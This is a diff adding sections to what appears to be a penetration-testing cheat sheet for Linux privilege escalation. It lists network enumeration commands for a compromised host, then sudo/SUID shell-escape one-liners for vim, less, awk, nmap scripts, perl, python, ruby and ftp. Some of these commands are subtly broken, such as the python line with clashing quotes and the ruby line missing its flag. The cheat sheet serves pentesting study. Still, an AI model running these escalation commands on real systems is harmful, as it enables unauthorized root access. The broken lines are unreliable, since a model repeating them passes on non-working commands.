@@ -94,3 +94,50 @@ Do any cron jobs run that execute scripts or binaries that we have write access 
 ```
 ls -la /etc/cron*
 ```
+## Network Check
+Does the compromised system connect to an internal network or possibly other vulnerable machines? 
+```
+user@target-machine:~$ ifconfig
+```
+Does it communicate to other systems or services?
+```
+user@target-machine:~$ tcpdump -i eth0
+```
+What systems has it had recent contact with?
+```
+user@target-machine:~$ arp -a
+```
+Which DNS server is the compromised system using?
+```
+user@target-machine:~$ cat /etc/resolv.conf
+```
+What other hosts/domains does the system have routes to?
+```
+user@target-machine:~$ cat /etc/hosts
+```
+
+## SuDo Escape Tests
+Some applications may allow you to run as super-user with `sudo`. If the program has an "escape-back-to-shell" function, it can be leveraged as a priviliege escalation vector. Here is a list of applications which have this feature. Check each one for SUID or `sudo` access from your compromised user. This requires the knownledge of the currently-compromised user account.
+### VI/VIM
+* :!bash
+* :set shell=/bin/bash:shell
+### Man, More, Less
+* !bash
+### Find+AWK
+* find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+### AWK
+awk 'BEGIN {system("/bin/bash")}'
+### NMAP
+* nmap --interactive; # then "!sh"
+* echo "os.execute('/bin/sh')" > exploit.nse
+* sudo nmap --script=exploit.nse
+### Perl
+* perl -e 'exec "/bin/bash";'
+### Python
+* python -c "import pty; pty.spawn("/bin/sh")"
+### Ruby
+* ruby exec "/bin/sh"
+### Echo
+* echo os.system('/bin/bash')
+### FTP
+* !/bin/sh
